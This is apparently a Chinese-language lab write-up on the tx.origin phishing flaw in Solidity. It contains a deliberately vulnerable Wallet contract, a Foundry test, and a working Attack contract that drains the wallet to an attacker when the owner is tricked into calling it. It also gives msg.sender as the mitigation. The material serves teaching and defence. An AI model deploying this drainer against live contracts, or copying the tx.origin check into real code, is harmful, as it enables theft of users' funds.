# TX.Origin - 钓鱼攻击  
[txorigin.sol](https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/txorigin.sol)  

**名称：** 不安全的tx.origin漏洞  

**描述：**  
tx.origin是Solidity中的一个全局变量，在智能合约中使用此变量进行身份验证会使合约容易受到网络钓鱼攻击。  

**场景：**  
Wallet 是一个简单的合约，只有所有者才能够将以太币转移到其他地址。Wallet.transfer() 使用 tx.origin 来检查调用者是否是所有者。让我们看看如何攻击这个合约。    


**发生了什么？**  
Alice被骗去调用Attack.attack().在Attack.attack()函数中，有将Alice钱包中的所有资金转移到Eve的地址的操作。由于Wallet.transfer()中的tx.origin等于Alice的地址，因此它授权了转移。钱包将所有以太币转移给了Eve。

**缓解措施：**  
建议使用msg.sender进行身份验证。  

**参考：**  
https://hackernoon.com/hacking-solidity-contracts-using-txorigin-for-authorization-are-vulnerable-to-phishing  

**合约：**  
```
contract Wallet {
    address public owner;

    constructor() payable {
        owner = msg.sender;
    }

    function transfer(address payable _to, uint _amount) public {
        // 应该使用msg.sender去检查而不是tx.origin
        require(tx.origin == owner, "Not owner");

        (bool sent, ) = _to.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }
}
``` 
**如何测试：**  
forge test --contracts src/test/txorigin.sol -vvvv  
```
// 用于测试使用tx.origin的漏洞的函数。
function testtxorigin() public {
    // “alice”和“eve”的地址是从以太坊虚拟机中获取的。
    address alice = vm.addr(1);
    address eve = vm.addr(2);

    // Alice得到10个以太币，Eve得到1个以太币。
    vm.deal(address(alice), 10 ether);
    vm.deal(address(eve), 1 ether);

    // 将msg.sender设置为alice。
    vm.prank(alice);

    // 使用 alice 的地址创建了一个 Wallet 合约，并向其发送了 10 以太币。
    WalletContract = new Wallet{value: 10 ether}();

    // 记录钱包合约的所有者。
    console.log("Owner of wallet contract", WalletContract.owner());

    // 将msg.sender设置为Eve。
    vm.prank(eve);

    // 使用 eve 的地址创建了一个 Attack 合约，并将 WalletContract 作为参数传递给它。
    AttackerContract = new Attack(WalletContract);

    // 记录攻击合约的所有者。
    console.log("Owner of attack contract", AttackerContract.owner());

    // 记录Eve的余额。
    console.log("Eve of balance", address(eve).balance);

    // Alice被骗调用attack函数
    vm.prank(alice, alice);
    AttackerContract.attack();

    // 记录tx.origin地址和msg.sender地址。
    console.log("tx origin address", tx.origin);
    console.log("msg.sender address", msg.sender);

    // 记录Eve更新后的余额。
    console.log("Eve of balance", address(eve).balance);
}

// Attack合约用于攻击Wallet合约的漏洞。
contract Attack {
    address payable public owner;
    Wallet wallet;

    // 构造函数接收一个 Wallet 合约作为参数。
    constructor(Wallet _wallet) {
        wallet = Wallet(_wallet);
        owner = payable(msg.sender);
    }

    // 攻击函数会将 wallet 合约中的所有以太币转移到 Attack 合约的拥有者地址上。
    function attack() public {
        wallet.transfer(owner, address(wallet).balance);
    }
}
``` 
**红框：** 将所有以太币转移到了 Eve 的地址。。  
![image](https://web3sec.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F4311be5d-785a-4446-886f-02787a9e7ba4%2FUntitled.png?table=block&id=02802dc6-5cc0-4060-aeb5-dc82768f57d3&spaceId=369b5001-5511-4fe6-a099-48af1d841f20&width=2000&userId=&cache=v2)